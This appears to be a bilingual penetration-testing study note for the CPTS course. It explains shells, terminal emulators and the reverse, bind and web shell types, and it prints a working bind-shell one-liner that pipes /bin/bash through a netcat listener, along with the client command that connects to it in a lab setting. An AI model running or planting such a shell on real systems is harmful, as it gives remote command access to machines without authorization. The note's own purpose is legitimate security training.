---
tags:
  - 渗透/CPTS
  - IT/Linux
---
> On a Linux system, the shell is a program that takes input from the user via the keyboard and passes these commands to the operating system to perform a specific function. In the early days of computing, the shell was the only interface available for interacting with systems. Since then, many more operating system types and versions have emerged along with the graphic user interface (GUI) to complement command-line interfaces (shell), such as the Linux terminal, Windows command-line (cmd.exe), and Windows PowerShell.

> Every operating system has a shell, and to interact with it, we must use an application known as a `terminal emulator`. Here are some of the most common terminal emulators:

- PuTTY
- xterm
- 等

> which has been pre-configured to use a `command language interpreter`, a program working to interpret the instructions provided by the user and issue the tasks to the operating system for processing.

- 即bash、PowerShell等，**shell是命令解释器的一个具体例子**。其他比如还有python解释器等。
- 当在终端随便输入命令然后被提示找不到命令时，可以说明其不在解释器的命令集中。



## 种类

| **Shell Type**                 | **Description**                                                                                                                                                                                                                                   |
| ------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Reverse shell`<br>[[反弹shell]] | Initiates a connection back to a "listener" on our attack box.                                                                                                                                                                                    |
| `Bind shell`                   | "Binds" to a specific port on the target host and waits for a connection from our attack box.                                                                                                                                                     |
| `Web shell`                    | Runs operating system commands via the web browser, typically not interactive or semi-interactive. It can also be used to run single commands (i.e., leveraging a file upload vulnerability and uploading a `PHP` script to run a single command. |


## Bind shell

用`nc`建立TCP会话连接后可发送文本，但并不是绑定shell，因为我们无法与操作系统和文件系统交互。

建立绑定shell：
```shell
Target@server:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f

# Client - Connecting to bind shell on target
TimeLess613@htb[/htb]$ nc -nv 10.129.41.200 7777
Target@server:~$  
```


## Reverse Shells

[[反弹shell]]

CPTS中PowerShell反弹shell用的<https://www.revshells.com/>的`PowerShell#2`。










---

## tricks

**关于为什么使用`bash -c`：单行代码中有些语法`sh`不支持，所以启动一个`bash`包装这行命令**
	![[Pasted image 20240414191955.png]]

